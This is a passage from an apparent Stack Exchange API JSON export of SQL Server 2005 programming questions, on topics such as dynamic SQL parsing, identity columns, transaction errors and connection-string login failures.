@Amount)  \n when '&gt;' then (@Amount is null) or (@Amount = 0 ) or (Amount&gt; @Amount)  \n when '&gt;=' then (@Amount is null) or (@Amount = 0 ) or (Amount&gt;= @Amount)      \nEND\n</code></pre>\n"},{"tags":["c#","sql","sql-server","sql-server-2005","ado.net"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":91,"score":-6,"question_id":12581230,"title":"Which Error Code is return in SQL Server when inserting duplicate value in primary key column (table)","body":"<p>Which Error Code is return in SQL Server when inserting duplicate value in primary key column (table) </p>\n\n<pre><code>  try\n     {\n         dataAdapterObj = new  SqlDataAdapter(selectString, conObj);\n         return true;\n     }\n     catch (Exception e)\n     {\n         MessageBox.Show(\"Exception is : \" + e.ToString());\n         return false;\n     }\n</code></pre>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12580078,"title":"Operate pairs from 2 tables in SQL","body":"<p>Say I have the following situation: I have some cities with buildings.\nEach city is divided into districts. Each district should have a \"main house\" (one per district).</p>\n\n<p>I have (sql server 2005) a corresponding associate table <code>CITY_BUILDS (IDCITY, IDBUILD)</code><br>\nI have also a buildings table <code>BUILD (ID, DISTRICT, IS_MAIN, COLOR)</code></p>\n\n<p>So, say the city mayor decided to repaint the \"main house\" of the districts in the color of the first house in the district list (crazy idea, but anyway)</p>\n\n<p>I need to in a city foreach district select the \"main house\", then search for the first district house, peek its color and paint the main house.</p>\n\n<p>I started a stub for my procedure but soon got confused...</p>\n\n<pre><code>DECLARE L_CURSOR CURSOR FAST_FORWARD FOR\nSELECT B.DISTRICT, B.IS_MAIN, B.ID \nFROM BUILD B \n    INNER JOIN CITY_BUILDS C_B \n        ON B.ID = C_B.IDBUILD                   \nWHERE IDCITY = 142 --AND B.IS_MAIN=1\nORDER BY DISTRICT\n</code></pre>\n\n<p><strong>PS.</strong> By FIRST building, I mean ANY first occurrence in the CITY_BUILDS list...\nAlso, that \"FIRST\" house should not be the MainHouse itself...</p>\n\n<p><strong>PPS.</strong> I used a cursor, because once I obtain the pair (ID_MAIN_HOUSE - ID_FIRST_HOUSE) in the real project I need to do call a stored procedure with that 2 arguments and the COLOR...</p>\n"},{"tags":["c#","asp.net","sql-server-2005","c#-4.0"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12578717,"title":"error in connect to sqlserver in windows and sql authentication mode","body":"<p>i have a snippet that it work properly when i use windowsmode with follow connection string</p>\n\n<pre><code>data source=.;database=xDB;integrated security=true;\n</code></pre>\n\n<p>but i have to change it for sql and windows mode i changeit to</p>\n\n<pre><code>Data Source=.;Initial Catalog=xDB;User Id=krs;Password=12345;\n</code></pre>\n\n<p>but follow error occur </p>\n\n<blockquote>\n  <p>Login failed for user 'krs'. The user is not associated with a trusted SQL Server connection.</p>\n</blockquote>\n\n<p>and when change dot(.) to(local) another error occur</p>\n\n<blockquote>\n  <p>A network-related or instance-specific error occurred while establishing a connection to SQL Server. The server was not found or was not accessible. Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: Named Pipes Provider, error: 40 - Could not open a connection to SQL Server)</p>\n</blockquote>\n\n<p>plz help me im beginer  n confused.thank</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12577578,"title":"using IF and else in Where clause and using IN ( in where condition field)","body":"<p>I want to run the following query. <code>@city</code> value will be provided run time </p>\n\n<pre><code>Select * from Emp\n    where empno in (\n        if( @city = 'Bangalore')\n            Begin\n                Select Empno from Emp\n                    where EmpCity = @city\n            End\n        Else\n            Begin\n                Select empno from Emp\n        End\n    )\n</code></pre>\n\n<p>Kindly help me by providing alternative</p>\n"}]}
{"total":14387,"page":7,"pagesize":100,"questions":[{"tags":["sql","sql-server-2005","stored-procedures","dynamic"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":130,"score":1,"question_id":12568283,"title":"Getting a temporary table returned from dynamic SQL in SQL Server 2005, and parsing","body":"<p>So I was requested to make a few things.... (it is Monday morning and for some reason this whole thing is turning out to be really hard for me to explain so I am just going to try and post a lot of my code; sorry)  Oh - the table idea has to stay.  Anything else can be changed but the idea of this table and the parsed field was not my idea but it is my responsibility to execute and make work.  </p>\n\n<p><strong>Edit:</strong> Sorry the post is long.  I do suggest a few possible solutions throughout but my problem is ultimately how everything is returned in a dynamically defined table/table variable from something (sp,view,function,anything...).  Please take a minute to read the whole post... </p>\n\n<p>First, I needed a table:</p>\n\n<pre><code>CREATE TABLE TICKET_INFORMATION ( \n    TICKET_INFO_ID INT IDENTITY(1,1) NOT NULL, \n    TICKET_TYPE INT, \n    TARGET_ID INT, \n    TARGET_NAME VARCHAR(100), \n    INFORMATION VARCHAR(MAX),   \n    TIME_STAMP DATETIME DEFAULT GETUTCDATE()\n)\n\n-- insert this row for testing...  \nINSERT INTO TICKET_INFORMATION (TICKET_TYPE, TARGET_ID, TARGET_NAME, INFORMATION) VALUES (1,1,'RT_ID','IF_ID,int=1&amp;IF_ID,int=2&amp;OTHER,varchar(10)=val,ue3&amp;OTHER,varchar(10)=val,ue4')\n</code></pre>\n\n<p>The Information column holds data that needs to be parsed into a table.  This is where I am having problems.  In the resulting table, Target_Name needs to become a column that holds Target_ID as a value for each row in the resulting table.  </p>\n\n<p>The string that needs to be parsed is in this format:\n<code>@var_name1,@var_datatype1=@var_value1&amp;@var_name2,@var_datatype2=@var_value2&amp;@var_name3,@var_datatype3=@var_value3</code></p>\n\n<p>And what I ultimately need as a result (in a table or table variable):</p>\n\n<pre><code>RT_ID       IF_ID       OTHER\n1           1           val,ue3\n1           2           val,ue3\n1           1           val,ue4\n1           2           val,ue4\n</code></pre>\n\n<p>And I need to be able to join on the result.  Initially, I was just going to make this a function that returns a table variable but for some reason I can't figure out how to get it into  an actual table variable.  Whatever parses the string needs to be able to be used directly in queries so I don't think a stored procedure is really the right thing to be using.  </p>\n\n<p>This is the code that parses the Information string... it returns in a temporary table.  In the end, this needs to be passed either just the information string or an ID number or something... doesn't matter what.  Or somehow it can be in a view with the ticket_information table.</p>\n\n<pre><code>-- create/empty temp table for var_name, var_type and var_value fields \nif OBJECT_ID('tempdb..#temp') is not null drop table #temp\ncreate table #temp (row int identity(1,1), var_name varchar(max), var_type varchar(30), var_value varchar(max)) \n\n-- just setting stuff up\ndeclare @target_name varchar(max), @target_id varchar(max), @info varchar(max)\n    set @target_name = (select target_name from ticket_information where ticket_info_id = 1) \n    set @target_id = (select target_id from ticket_information where ticket_info_id = 1) \n    set @info = (select information from ticket_information where ticket_info_id = 1) \n    --print @info\n\n-- some of these variables are re-used later    \ndeclare @col_type varchar(20), @query varchar(max), @select as varchar(max) \nset @query = 'select ' + @target_id + ' as ' + @target_name + ' into #target; '\nset @select = 'select * into ##global_temp from #target'  \n\n\ndeclare @var_name varchar(100), @var_type varchar(100), @var_value varchar(100) \ndeclare @comma_pos int, @equal_pos int, @amp_pos int        \n    set @comma_pos = 1\n    set @equal_pos = 1\n    set @amp_pos   = 0 \n\n-- while loop to parse the string into a table \nwhile @amp_pos &lt; len(@info) begin  \n\n    -- get new comma position\n    set @comma_pos  = charindex(',',@info,@amp_pos+1)   \n\n    -- get new equal position\n    set @equal_pos  = charindex('=',@info,@amp_pos+1)   \n\n    -- set stuff that is going into the table \n    set @var_name   = substring(@info,@amp_pos+1,@comma_pos-@amp_pos-1)  \n    set @var_type   = substring(@info,@comma_pos+1,@equal_pos-@comma_pos-1) \n\n    -- get new ampersand position \n    set @amp_pos    = charindex('&amp;',@info,@amp_pos+1) \n    if @amp_pos=0   or @amp_pos&lt;@equal_pos set @amp_pos = len(@info)+1\n\n    -- set last variable for insert into table \n    set @var_value  = substring(@info,@equal_pos+1,@amp_pos-@equal_pos-1)\n\n    -- put stuff into the temp table \n    insert into #temp (var_name, var_type, var_value) values (@var_name, @var_type, @var_value) \n\n    -- is this a new field?\n    if ((select count(*) from #temp where var_name = (@var_name)) = 1) begin \n        set @query = @query + ' create table #' + @var_name + '_temp (' + @var_name + ' ' + @var_type + '); '    \n        set @select = @select + ', #' + @var_name + '_temp '\n    end \n\n    set @query = @query + ' insert into #' + @var_name + '_temp values (''' + @var_value + '''); '   \nend \n\n\nif OBJECT_ID('tempdb..##global_temp') is not null drop table ##global_temp\nexec (@query + @select) \n\n--select @query\n--select @select \n\nselect * from ##global_temp \n</code></pre>\n\n<p>Okay.  So, the result I want and need is now in ##global_temp.  How do I put all of that into something that can be returned from a function (or something)?  Or can I get something more useful returned from the exec statement?  In the end, the results of the parsed string need to be in a table that can be joined on and used... Ideally this would have been a view but I guess it can't with all the processing that needs to be done on that information string.  </p>\n\n<p>Ideas?  </p>\n\n<p>Thanks!</p>\n\n<p><strong>Edit:</strong>  Still looking for answers to this.  I would love to have a function that returns a table variable but I don't know how to get the results into a table variable.  The result is currently in a global temporary table.  Would it work if I defined my table variable in the dynamic portion of the code and then it would just magically be there to return?  Or can I somehow select into a table variable from my global temp table, without first defining the columns of the table variable?  Or can I create the table variable when I execute the dynamic part?  The whole problem is because the columns of the end result are dynamic....... so..... I'm not sure how I could clarify the issues I'm having more.  <strong>If a function that returns a table is a good route to go - could someone please provide me with code or a link as an example for returning a table variable with a dynamic column definition from a function?  Plz, thnx.</strong></p>\n"},{"tags":["c#","asp.net",".net","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":12574658,"title":"SQL Server fire off a web request","body":"<p>Do to some constraints with a client's system and setup, I am wondering if it is possible for SQL Server to fire off a web request?</p>\n\n<p>I need to be able to send emails after a sql server column gets updated. I had a trigger with database mail but the database server on the client won't allow that. The alternative would have that figure fire off a web request when ready. I would do it via a web service on the web server and have it just poll the table, but that seems like a lot of wasteful cycles.</p>\n\n<p>Any ideas?</p>\n"},{"tags":["c#","asp.net",".net","sql-server-2005","email"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12573663,"title":"Sending email after a database column is updated","body":"<p>I have a web app for a client built in C# .Net 3.5. The web app does lots of things and there is one part where I send some data via an asychronous web request to do some processing on the database. This can take anywhere from 5 to 60 minutes.  </p>\n\n<p>I then created a SQL trigger that when the column in the database that uses the Database Mail to send mail (via msdb.dbo.sp_send_dbmail).</p>\n\n<p>This works fine, but our client forbids us to send mail from the database server.</p>\n\n<p>Anyone have an alternative to this?</p>\n"},{"tags":["sql-server","sql-server-2005","tsql","identity","sql-server-2005-express"],"answer_count":10,"favorite_count":5,"up_vote_count":30,"down_vote_count":1,"view_count":59642,"score":29,"question_id":751522,"title":"How to change identity column values programmatically?","body":"<p>I have a MS SQL 2005 database with a table Test with column ID. ID is a identity column. I have rows in this table and all of them have their corresponding ID autoincremented value.</p>\n\n<p>Now I would like to change every ID in this table like this:</p>\n\n<pre><code>ID = ID + 1\n</code></pre>\n\n<p>But when I do this I get error:</p>\n\n<pre><code>Cannot update identity column 'ID'.\n</code></pre>\n\n<p>I've tried with:</p>\n\n<pre><code>ALTER TABLE Test NOCHECK CONSTRAINT ALL \nset identity_insert ID ON\n</code></pre>\n\n<p>But this does not solve this problem.</p>\n\n<p>I need to have identity set to this column, but I need to change values as well from time to time. So my question is how to acomplish this task that is required by my project.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":4,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":4063,"score":6,"question_id":2265629,"title":"Transaction count after EXECUTE indicates that a COMMIT or ROLLBACK TRANSACTION statement is missing - SQL server 2005","body":"<p>I am getting the error from the application as following with SQL server 2005 </p>\n\n<blockquote>\n  <p>\"Transaction count after EXECUTE\n  indicates that a COMMIT or ROLLBACK\n  TRANSACTION statement is missing.\n  Previous count = 1,  current count =\n  0\"</p>\n</blockquote>\n\n<p>How can i find the stage where this error raised?\nhow can i found the missing transaction or the stored procedure where it is not committ or rollback?</p>\n"},{"tags":["c#","asp.net","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":255,"score":0,"question_id":7411879,"title":"How to create festival calendar in ASP.net","body":"<p>I want to make a festival calendar using asp.net from that I used two ajax calendar and one textbox it is a festival textbox where we enter festival which FromDate and ToDate respectively. I want to do this as following point</p>\n\n<ol>\n<li><p>If I enter in textbox Christmas and Choose Fromdate=25/12/2011 and ToDate=31/12/2011 then it will be valid</p></li>\n<li><p>If I choose fromDate=25/12/2011 and ToDate=24/12/2011 then it will invalid</p></li>\n<li><p>If I choose Fromdate=25/12/2011 and Todate=28/12/2011 then also it is invalid because it coming in between 25/12/2011 and 31/12/2011</p></li>\n<li><p>If I Choose fromdate=1/1/2011 and ToDate=1/1/2011 then it is valid</p></li>\n<li><p>If I choose fromdate=21/12/2011 and 25/12/2011 then it is invalid because of already Christmas done in 1/1/2011</p></li>\n</ol>\n\n<p>And all date should show in gridview like 25-dec-2011 format </p>\n\n<p>Here is my code:    </p>\n\n<pre><code>DateTime dt1 = Convert.ToDateTime(txt_fromdate.Text);\nDateTime dt2 = Convert.ToDateTime(txt_todate.Text);\nif (dt1 &gt; dt2)\n{\n    con.Open();\n    com = new SqlCommand(\"BTNN_MovieDB_Festival_Details_Insert\", con);\n    com.Parameters.Add(\"@fromdate\", SqlDbType.VarChar).Value = dateformat_mmdd(txt_fromdate.Text.ToString().Trim());\n    com.Parameters.Add(\"@todate\", SqlDbType.VarChar).Value = dateformat_mmdd(txt_todate.Text.ToString().Trim());\n    com.Parameters.Add(\"@return\", SqlDbType.VarChar).Direction = ParameterDirection.ReturnValue;\n    com.ExecuteNonQuery();\n    con.Close();\n    showdata();\n}\nelse if (dt1 &lt; dt2)\n{\n    lblerror.Text = \"ToDate should be greater than FromDate\";\n\n}\n</code></pre>\n"},{"tags":["sql-server-2005","clr","sqlclr"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12574912,"title":"Install a SQL CLR user defined function","body":"<p>I'm testing out some SQL CLR stuff in VS 2008 and SQL Server 2005, how do I install a user defined function on the database? I built it and have the DLL, but now what?</p>\n"},{"tags":["sql","sql-server-2005","transactions"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":713,"score":1,"question_id":1440522,"title":"What happens to the transaction in this SQL if it's not committed?","body":"<p>If I have the following SQL:</p>\n\n<pre><code>BEGIN TRANSACTION\nSELECT val\nFROM myTable\n</code></pre>\n\n<p>and don't follow it up with a commit, what happens with the TRANSACTION? Does it depend upon the context/scope that it was executed (e.g. in a proc, in mgt studio)?</p>\n\n<p>Is there some place to see if there are transactions open that have not been committed/rolled back in a database?</p>\n\n<p>Thanks,</p>\n\n<p>Chris</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12572100,"title":"SQL Server 2005 Update query with Lookup Table","body":"<p>I have two tables;</p>\n\n<p>Technology Look Up table</p>\n\n<pre><code>OSID  OSValue  \n\n1     UNIX             \n2     ORACLE            \n3     .NET \n4     SQL    \n5     SAP  \n\n------------------\n</code></pre>\n\n<p>Employee technology</p>\n\n<pre><code>empID   OSID\n\n34      1\n37      2\n45      2\n34      4\n45      6\n</code></pre>\n\n<p>Employee ID NO 37 is no more using ORACLE . He shifted to SAP . That is OSID should b updated from 2 to 5 in the second table .</p>\n\n<p>I have a temp table that has vales for technology and employee id </p>\n\n<p>Please help me with \n- writing a query that joins both above tables\n- Look up the ID of the SAP technology , and update the second table with that ID .</p>\n\n<pre><code>Update emp\nSet emp.OSID = (Select OSID from technologylookup where OSValue = tmptbl.technologyname)\nFROM employee_tech emp INNER JOIN #Temptbl tmptbl ON emp.emp_id = tmptbl.emp_id\n</code></pre>\n"},{"tags":["sql","sql-server-2008","sql-server-2005","stored-procedures"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":12569229,"title":"SQL Server : stored procedure IFNULL check","body":"<pre><code>Solution_id (Primary key, Int)\nCol1 (varchar)\nCol2 (varchar)\nCol3 (varchar)\nCol4 (varchar)\nCol5 (varchar)\n</code></pre>\n\n<p>I am writing a stored procedure to update this table. There are 6 input parameters for the above 6 columns.</p>\n\n<pre><code>@Attached_File1 VARCHAR(MAX),\n@Attached_File2 VARCHAR(MAX),\n@Attached_File3 VARCHAR(MAX),\n@Attached_File4 VARCHAR(MAX),\n@Attached_File5 VARCHAR(MAX),\n@Ticket_ID BIGINT\n</code></pre>\n\n<p>I want to write a SQL query which will update the table with the values specified in the input parameters. BUT I must not overwrite the attachment columns with null. I mean I need to use only those parameters which contains data.</p>\n\n<p>For example, if the table has a row</p>\n\n<pre><code>[10, \"aaa\", \"bbb\", \"efg\", null, null] \n</code></pre>\n\n<p>and the input parameters are </p>\n\n<pre><code>(10, null, null, \"mno\", \"ddd\", null) \n</code></pre>\n\n<p>then after the update the row will become </p>\n\n<pre><code>[10, \"aaa\", \"bbb\", \"mno\", \"ddd\", null]\n</code></pre>\n\n<p>How to check for null/empty strings and generate the update query accordingly to achieve this?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":8,"down_vote_count":0,"view_count":159,"score":8,"question_id":12544051,"title":"Randomly assign work location and each location should not exceed the number of designated employees","body":"<p>I am trying to select unique random posting/recruitment places of employees within a list of places, all the employees are already posted at these places, i am trying to generate a new random posting place for them with \"where\" condition that \"employee new random location will not be equal to their home place and randomnly selected Employees with their designation must be less than or equal to Place wise designation numbers from Places table \"</p>\n\n<p>the Employee table is :</p>\n\n<pre><code>EmpNo   EmpName           CurrentPosting    Home        Designation   RandomPosting\n1       Mac               Alabama           Missouri      Manager       \n2       Peter             California        Montana       Manager       \n3       Prasad            Delaware          Nebraska      PO       \n4       Kumar             Indiana           Nevada        PO       \n5       Roy               Iowa              New Jersey    Clerk       \n</code></pre>\n\n<p>And so on...</p>\n\n<p>And the Places table (PlaceNames with number of employees  - designation wise) is :-</p>\n\n<pre><code>PlaceID  PlaceName      Manager     PO    Clerk\n1        Alabama           2        0     1\n2        Alaska            1        1     1\n3        Arizona           1        0     2\n4        Arkansas          2        1     1\n5        California        1        1     1\n6        Colorado          1        1     2\n7        Connecticut       0        2     0\n</code></pre>\n\n<p>and so on...</p>\n\n<p>tried with with newid() like as below and to be able to select Employees with RandomPosting place names,</p>\n\n<pre><code>WITH cteCrossJoin AS (\nSELECT e.*, p.PlaceName AS RandomPosting,\n       ROW_NUMBER() OVER(PARTITION BY e.EmpNo ORDER BY NEWID()) AS RowNum\n    FROM Employee e\n        CROSS JOIN  Place p\n    WHERE e.Home &lt;&gt; p.PlaceName\n)\nSELECT *\nFROM cteCrossJoin\nWHERE RowNum = 1;\n</code></pre>\n\n<p>additionally I need to limit the random selection based upon designation numbers(in Places table)... that is to assign each Employee a PlaceName(from Places) randomly which is not equal to CurrentPosting and Home(in Employee) and Place wise designation will not exceed as given numbers.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":2854718,"title":"Processing a resultset to look up foreign keys (and poulate a new table!)","body":"<p>I've been handed a dataset that has some fairly basic table structures with no keys at all. eg</p>\n\n<pre><code>{myRubishTable} - Area(varchar),AuthorityName(varchar),StartYear(varchar),StartMonth(varcha),EndYear(varchar),EndMonth(varchar),Amount(Money)\n</code></pre>\n\n<p>there are other tables that use the Area and AuthorityName columns as well as a general use of Month and Years so I I figured a good first step was to pull Area and Authority into their own tables. </p>\n\n<p>I now want to process the data in the original table and lookup the key value to put into my new table with foreign keys which looks like this. </p>\n\n<pre><code>(lookup Tables)\n{Area} - id (int, PK), name (varchar(50))\n{AuthorityName} - id(int, PK), name(varchar(50)\n\n(TargetTable)\n{myBetterTable} - id (int,PK), area_id(int FK-Area),authority_name_id(int FK-AuthorityName),StartYear (varchar),StartMonth(varchar),EndYear(varchar),EndMonth(varchar),Amount(money)\n</code></pre>\n\n<p>so row one in the old table read</p>\n\n<pre><code>MYAREA, MYAUTHORITY,2009,Jan,2010,Feb,10000\n</code></pre>\n\n<p>and I want to populate the new table with</p>\n\n<pre><code>1,1,1,2009,Jan,2010,Feb,10000\n</code></pre>\n\n<p>where the first '1' is the primary key and the second two '1's are the ids in the lookup tables.</p>\n\n<p>Can anyone point me to the most efficient way of achieving this using just SQL?</p>\n\n<p>Footnote:- I've achieved what I needed with some pretty simple WHERE clauses (I had left a rogue tablename in the FROM which was throwing me :o(  ) but would be interested to know if this is the most efficient.</p>\n\n<p>ie</p>\n\n<pre><code>SELECT   [area].[area_id],\n         [authority].[authority_name_id],\n         [myRubishTable].[StartYear],\n         [myRubishTable].[StartMonth],\n         [myRubishTable].[EndYear],\n         [myRubishTable].[EndMonth],\n         [myRubishTable].[Amount]\nFROM     [myRubishTable],[Area],[AuthorityName]\nWHERE   [myRubishTable].[Area]=[Area].[name]\nAND      [myRubishTable].[Authority Name]=[dim_AuthorityName].[name]\n</code></pre>\n"},{"tags":["sql-server-2005","ssis","parameter-passing"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":99,"score":0,"question_id":12565964,"title":"Return Integer value from SSIS execute SQL Task","body":"<p>I am using SQL Server 2005 Business Intelligence Studio and struggling with returning an integer value from a very simple execute SQL Task. \nFor a very simple test, I wrote the SQL Statement as:\n    <pre><code>Select 35 As 'TotalRecords'</code></pre></p>\n\n<p>Then, I specified ResultSet as</p>\n\n<pre><code>ResultName = TotalRecords and\nVariableName = User::TotalRecords\n</code></pre>\n\n<p>When I execute this, the statement is executed but the variable doesn't have the updated value. However, it has the default value that I specified while variable definition.</p>\n\n<p>The return of a date variable works, but integer variable isn't working. The type of <code>User::TotalRecords</code> specified is Int32 in a package scope.</p>\n\n<p>Thanks for any hints</p>\n"},{"tags":["sql-server","database","sql-server-2005","union"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3004,"score":0,"question_id":650040,"title":"Updateable view in mssql with multiple tables and computed values","body":"<p>Huge database in mssql2005 with big codebase depending on the structure of this database.</p>\n\n<p>I have about 10 similar tables they all contain either the file name or the full path to the file. The full path is always dependent on the item id so it doesn't make sense to store it in the database. Getting useful data out of these tables goes a little like this:</p>\n\n<pre><code>SELECT a.item_id\n, a.filename\nFROM (\n    SELECT id_item AS item_id\n    , path AS filename\n    FROM xMedia\n\n    UNION ALL\n\n    -- media_path has a different collation\n    SELECT item_id AS item_id\n    , (media_path COLLATE SQL_Latin1_General_CP1_CI_AS) AS filename\n    FROM yMedia\n\n    UNION ALL\n\n    -- fullPath contains more than just the filename\n    SELECT itemId AS item_id\n    , RIGHT(fullPath, CHARINDEX('/', REVERSE(fullPath))-1) AS filename\n    FROM zMedia\n\n    -- real database has over 10 of these tables\n) a\n</code></pre>\n\n<p>I'd like to create a single view of all these tables so that new code using this data-disaster doesn't need to know about all the different media tables. I'd also like use this view for insert and update statements. Obviously old code would still rely on the tables to be up to date.</p>\n\n<p>After reading the msdn page about <a href=\"http://msdn.microsoft.com/en-us/library/ms187956%28SQL.90%29.aspx\" rel=\"nofollow\">creating views in mssql2005</a> I don't think a view with SCHEMABINDING would be enough.</p>\n\n<p>How would I create such an updateable view?</p>\n\n<p>Is this the right way to go?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1956,"score":0,"question_id":8938527,"title":"sp_generate_inserts for SQL Server 2008","body":"<p>I've been using Narayana Vyas Kondreddi's excellent stored procedure <code>sp_generate_inserts</code> <a href=\"http://vyaskn.tripod.com/code/generate_inserts.txt\" rel=\"nofollow\">http://vyaskn.tripod.com/code/generate_inserts.txt</a> in a SQL Server 2005 database. </p>\n\n<p>But after moving to SQL Server 2008 I get weird results where a long whitespace is inserted after UNIQUEIDENTIFIER values:</p>\n\n<pre><code>INSERT INTO [BannerGroups]([Id], [DescriptionText], [Width], [Height]) \nVALUES('BFCD0173-9432-47D1-84DF-8AB3FB40BF76                                                                                                                                                                                                                           ', 'Example', 145, NULL)\n</code></pre>\n\n<p>Anyone know how to fix this?</p>\n"},{"tags":["c#",".net","sql-server-2005","transactions"],"answer_count":1,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":67,"score":4,"question_id":7685577,"title":"Rolling back previously committed transaction","body":"<p>In the service I am currently developing I need to provide a twofold operation:</p>\n\n<ol>\n<li>The request being made should be registered in the database (using <code>Register()</code> method); and</li>\n<li>The request should be sent to an external <em>webservice</em> for further processing (using <code>Dispatch()</code> method).</li>\n</ol>\n\n<p>Considering that I can't switch the order of the operations, I would like to be able to \"rollback\" the first one if something goes wrong with the second, so that a then-invalid record does not get inserted to the BD. The problem here is that, of course, I am commiting the transaction inside the <code>Register</code> method. Is there any way I can roll it back from inside the <code>Dispatch</code> method if anything goes wrong?</p>\n\n<p>Edit: All transaction are being managed from the .NET-side.</p>\n"},{"tags":["sql-server-2005","batch","osql"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12561074,"title":"How to get error name in batch when I use OSQL command?","body":"<p>I created a batch file which execute a sql command.</p>\n\n<p>Let's see the piece of code</p>\n\n<pre><code>SET OSQL=\"C:\\Program Files (x86)\\Microsoft SQL Server\\90\\Tools\\Binn\\osql.exe\"\nIF NOT EXIST %OSQL% ECHO OSQL.EXE not found, please check the OSQL variable!\nIF NOT EXIST %OSQL% GOTO :ERROR\n\nSET SQLQUERY_UPDATEDB = \"SELECT * FROM %DB%\";\n\n%OSQL% -S %SQLSERVERNAME% -d %DBNAME% -U %DBACCOUNT% -P %DBPASSWORD% -Q %SQLQUERY_UPDATEDB% -n -b -m-1 &gt; D:\\sqloutput.txt\n\n:ERROR\nECHO Sorry, could not complete your request!\nECHO %ERRORLEVEL%\nGOTO :END\n\n:END\nECHO Finish batch\n</code></pre>\n\n<p>The above part of code returns always 0 and <code>Sorry, could not complete your request!</code> . What does mean ?</p>\n\n<p>How to set up to display error in console to see exactly what does wrong ?</p>\n\n<p>I put <code>-m-1</code> and I removed <code>-h-1</code> accordingly with <a href=\"http://msdn.microsoft.com/en-us/library/ms162806.aspx\" rel=\"nofollow\">MSDN</a> but doesn't show up in my console.</p>\n\n<p>Thank you.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":8,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":19681,"score":3,"question_id":495700,"title":"Can we write a sub function or procedure inside another stored procedure - SQL Server","body":"<p>I want to check if SQL Server(2000/05/08) has the ability to write a nested stored procedure, what I meant is - WRITING a Sub Function/procedure inside another stored procedure. NOT calling another SP. </p>\n\n<p>Why I was thinking about it is- One of my SP is having a repeated lines of code and that is specific to only this SP.So if we have this nested SP feature then I can declare another sub/local procedure inside my main SP and put all the repeating lines in that. and I can call that local sp in my main SP. I remember such feature is available in Oracle SPs.</p>\n\n<p>If SQL server is also having this feature, can someone please explain some more details about it or provide a link where I can find documentation.</p>\n\n<p>Thanks in advance\nSai</p>\n"},{"tags":["sql","sql-server-2005","tsql"],"answer_count":10,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":349,"score":2,"question_id":1773333,"title":"Interesting SQL issue","body":"<p>I have a SQL problem I am trying to digest. I am using SQL Server 2005.</p>\n\n<p>In a table I have data as such:</p>\n\n<pre><code>ID     Type\n1        A\n2        A\n3        A\n3        B\n4        B\n</code></pre>\n\n<p>I need to find all of the IDs that have a Type of both A and B.</p>\n"},{"tags":["sql","sql-server-2005","query"],"answer_count":10,"favorite_count":3,"up_vote_count":8,"down_vote_count":0,"view_count":19578,"score":8,"question_id":591853,"title":"Search for a string in an all the tables, rows and columns of a DB","body":"<p>I am lost in a big database and I am not able to find where the data I get comes from. I was wondering if it is possible with SQL Server 2005 to search for a string in an all the tables, rows and columns of a DB?</p>\n\n<p>Does anybody has an idea if it is possible and how?</p>\n\n<p>Thanks!</p>\n"},{"tags":["delphi","sql-server-2005","stored-procedures","dataset"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":462,"score":1,"question_id":3227880,"title":"Everytime I try to communicate with my database with stored procedures I get this \"Cannot perform this operation on a closed dataset\"","body":"<p>I'm working on a Delphi project with a MS SQL Server database, I connected the database with ADOConnection, DataSource and ADOProc components from Borland Delphi 7 and I added this code in behind:</p>\n\n<pre><code>procedure TForm1.Button2Click(Sender: TObject);\nbegin\n  ADOStoredProc1.ProcedureName := 'sp_Delete_Clen';\n  ADOStoredProc1.Refresh;\n  ADOStoredProc1.Parameters.ParamByName('@clenID').Value := Edit6.Text;\n  ADOStoredProc1.Active := True;\n  ADOStoredProc1.ExecProc;\nend;\n</code></pre>\n\n<p>The component Edit6 is an editbox that takes the ID of the tuple that should be deleted from the database and ADOStoredProc1 is the stored procedure in the database that takes 1 parametar (the ID you want to delete).\nThe project runs with no problems, I even got a TADOTable and a DBGrid that load the information from the database, but when I try to delete a tuple from the database using its ID written in the EditBox I get this Error: \"Cannot perform this operation on a closed dataset\" and the breakpoint of the project is when the application tries to add the value for the 'clenID' parameter.\nWhere is my mistake and how to fix 